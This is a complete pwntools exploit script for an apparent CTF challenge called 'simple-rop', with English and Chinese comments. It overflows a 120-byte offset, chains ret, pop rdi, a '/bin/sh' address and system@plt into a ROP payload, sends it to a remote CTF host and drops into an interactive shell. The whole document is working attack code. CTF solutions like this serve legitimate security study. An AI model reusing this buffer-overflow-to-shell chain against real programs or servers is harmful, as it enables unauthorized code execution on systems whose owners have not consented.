from pwn import *

# 1. Establish Connection / 建立连接
# Connecting to the remote CTF server. Use process() for local debugging.
# 连接到远程 CTF 服务器。如果是本地调试，可以使用 process('./simple-rop')。
p = remote('svtctf.m0lecon.it', 13492)

# 2. Address Configuration / 地址配置 (ROP Gadgets & Functions)
# Found using ROPgadget or 'info functions' in GDB.
# 这些地址通过 ROPgadget 工具或者 GDB 中的 'info functions' 命令找到。

# pop rdi ; ret -> Used to move the first argument into RDI (x64 calling convention).
# 64位调用约定中，第一个参数通过 RDI 传递，此指令用于设置参数。
pop_rdi_addr = 0x4011a5  

# system@plt -> The address of system() in the Procedure Linkage Table.
# system 函数在 PLT 表中的地址，用于执行系统命令。
system_addr  = 0x401040  

# /bin/sh -> Address where the "/bin/sh" string is stored in the binary.
# 二进制文件中 "/bin/sh" 字符串存放的地址。
bin_sh_addr  = 0x404050  

# ret -> A simple 'ret' instruction used for stack alignment.
# 一个单纯的 'ret' 指令，用于解决 Ubuntu 18.04+ 系统中 system 函数的对齐崩溃问题。
ret_addr     = 0x4011a6  

# 3. Offset Calculation / 偏移量计算
# 0x70 (112 bytes for buffer) + 8 bytes (saved RBP) = 120 bytes.
# 0x70 字节的缓冲区长度 + 8 字节的旧 RBP 寄存器，总共 120 字节到达返回地址。
offset = 120

# 4. Construct Payload / 构造攻击载荷
# [ Padding ] + [ Stack Alignment ] + [ POP RDI ] + [ Argument ] + [ SYSTEM ]
# [ 填充数据 ] + [ 栈对齐 ] + [ 设置参数指令 ] + [ 参数地址 ] + [ 调用系统函数 ]

payload = b'A' * offset       # Fill buffer up to the Return Address / 填满缓冲区到返回地址
payload += p64(ret_addr)      # Align stack for system() / 确保栈对齐（16字节对齐）
payload += p64(pop_rdi_addr)  # Jump to pop rdi; ret / 跳到设置参数的 Gadget
payload += p64(bin_sh_addr)   # The string address for system() / 作为参数传递给 system 的字符串
payload += p64(system_addr)   # Return into system() / 最后“返回”到 system 函数执行

# 5. Sending Attack / 发送攻击
print(f"[*] Sending payload with offset {offset}...")
# Wait for the prompt before sending the payload.
# 在发送 Payload 之前等待程序输出 "name:" 提示符。
p.recvuntil(b"name:") 
p.sendline(payload)

# 6. Interaction / 获取交互
# Switch to manual control to execute commands (e.g., 'cat flag').
# 切换到交互模式，你可以手动输入命令（比如 'cat flag'）了。
p.interactive()